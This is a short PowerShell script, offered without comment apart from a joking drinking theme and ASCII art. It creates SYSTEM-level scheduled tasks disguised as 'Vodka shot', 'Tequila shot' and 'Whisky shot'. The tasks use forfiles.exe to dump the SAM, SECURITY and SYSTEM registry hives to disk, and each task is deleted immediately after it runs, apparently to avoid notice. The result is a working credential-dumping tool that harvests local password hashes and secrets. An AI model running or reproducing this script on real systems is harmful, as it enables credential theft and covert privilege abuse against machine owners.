$taskName1 = "Vodka shot"
$taskName2 = "Tequila shot"
$taskName3 = "Whisky shot"
#$taskAction = "forfiles.exe /p C:\Windows /m win.ini /c \"powershell -c reg SAVE HKEY_LOCAL_MACHINE\SAM C:\SAMATUDI\""
$taskDescription = "Chug chug!"

$action1 = New-ScheduledTaskAction -Execute "forfiles.exe" -Argument '/p C:\Windows /m win.ini /c "powershell -c reg SAVE HKLM\SAM C:\SAM"'
$action2 = New-ScheduledTaskAction -Execute "forfiles.exe" -Argument '/p C:\Windows /m win.ini /c "powershell -c reg SAVE HKLM\SECURITY C:\SECURITY"'
$action3 = New-ScheduledTaskAction -Execute "forfiles.exe" -Argument '/p C:\Windows /m win.ini /c "powershell -c reg SAVE HKLM\SYSTEM C:\SYTEM"'


$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)  
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -Action $action1 -Trigger $trigger -Principal $principal -Settings $settings -TaskName $taskName1 -Description $taskDescription
Start-ScheduledTask -TaskName $taskName1
Start-Sleep -Seconds 5
Unregister-ScheduledTask -TaskName $taskName1 -Confirm:$false

Register-ScheduledTask -Action $action2 -Trigger $trigger -Principal $principal -Settings $settings -TaskName $taskName2 -Description $taskDescription
Start-ScheduledTask -TaskName $taskName2
Start-Sleep -Seconds 5
Unregister-ScheduledTask -TaskName $taskName2 -Confirm:$false

Register-ScheduledTask -Action $action3 -Trigger $trigger -Principal $principal -Settings $settings -TaskName $taskName3 -Description $taskDescription
Start-ScheduledTask -TaskName $taskName3
Start-Sleep -Seconds 5
Unregister-ScheduledTask -TaskName $taskName3 -Confirm:$false

Write-Host "Scheduled tasks have been created, executed and deleted. Enjoy!"

<#Write-Host @"                                                                                                    
                                                                                                    
                                                                                                    
                                         @@@@@@@@@@@@                                               
                                              @@@@@@@@                                              
                                                @@@@@@                                              
                                                  @@@@                                              
                                              @@  @@@@@                                             
                                              @@@ @@@ @                                             
                                             @@@ @@@@ @                                             
                                            @@@  @@@@ @                                             
                                            @@  @@@@@ @                                             
                                           @@@ @@@@@                                                
                                          @@@ @@@@@@                                                
                                         @@@  @@@@@@                                                
                                        @@@  @@@@@@@                                                
                                       @@@  @@@@@@@@                                                
                                       @@  @@@@@@@@@                                                
                                      @@  @@@@@@@@@@                                                
                                     @@@ @@@@@@@@@@@ @                                              
                                     @@  @@@@@@@@@@@ @@                                             
                                     @@ @@@@@@@@@@@@  @@                                            
                                    @@ @@@@@@@@@@@@@@ @@@                                           
                                    @@@@@@@@@@@@@@@@@ @@@@                                          
                                    @@@@@@  @@@@@@@@  @@@@                                          
                                    @@@@@@  @@@@@@@@  @@@@                                          
                                    @@@@@@  @@@@@@@@  @@@@@                                         
                                    @@@@@@  @@@@@@@@  @@@@@                                         
                                    @@@@@   @@@@@@@  @@@@@@                                         
                                    @@@@@@@@@@@@@@@  @@@@@@                                         
                                     @@@@@ @@@@@@@@  @@@@@@                                         
                                    @@@@@  @@@@@@@@  @@@@@@                                         
                                    @  @   @@@@@@@                                                  
                                   @@  @ @@@@@@@@@ @@@@@@@@@@@@@@@@@@                               
                             @@          @@@@@@@@@   @@@@   @         @  @@                         
                            @@@@@@@@@@@  @     @@@   @@@@     @@@@@@@@@@  @                         
                            @@ @         @@@@@@@@@@  @@@@ @ @@@           @                         
                             @  @  @@  @   @@@@@@@    @@@                @@                         
                             @  @       @  @@@@@@@@   @@@@@              @                          
                             @  @@   @@ @   @@@@@@@@@@  @@@@@@@          @                          
                             @@  @@@    @@  @@@@@@ @@@    @@ @           @                          
                              @  @@@@ @@@@  @@@@@@ @@@@@ @@@ @          @                           
                              @  @@    @@@   @@@@@ @@@@@  @@@           @                           
                              @    @@ @@@@   @@@@@@@@@@@@ @@            @                           
                               @  @ @@@ @@@  @@@@@@ @@@@  @@           @                            
                               @  @@@@ @@@@@  @@@@@ @@@@  @            @                            
                               @   @@@ @  @@  @@@@@ @@@@  @@           @                            
                                @    @ @ @ @@ @@@@@@@@@ @ @            @                            
                                @   @@@ @@ @@ @@@@@@@@@ @@@           @                             
                                @     @    @@ @@@@@@@@@  @            @                             
                                 @  @ @ @@@@@@ @@@@@@  @@             @                             
                                 @  @@@@ @  @@ @@@@@  @@ @            @                             
                                 @  @@@@@@@ @@ @@@@@  @              @@                             
                                 @  @ @@@ @@@@@ @@@ @    @            @                             
                                 @@   @@@@@@@@@@ @@  @@@@@            @                             
                                  @  @@@@  @@@@@@   @@@             @ @                             
                                  @  @@@@@   @@@@@@     @@           @                              
                                  @ @ @@@@@@@   @@@@@@@@@@@@@@@@@@@@ @                              
                                  @ @ @@ @@@  @@              @@@@@  @                              
                                  @ @@  @@  @@@ @@@@@@@@@@  @@  @  @@                               
                                      @      @ @@@@@@@@@@@@@@      @@                               
                                   @  @                        @  @@ @                              
                                   @  @@                       @  @  @                              
                                       @                          @  @                              
                                   @   @  @                     @@   @                              
                                   @@@@@@   @@  @ @  @@   @@@@@@  @@@                               
                                   @@@@  @@@@ @@@@@ @@ @@@@     @@ @                                
                                       @ @@@@@@ @@@@@@@@  @@@@@@ @@@@@            
"@`
#>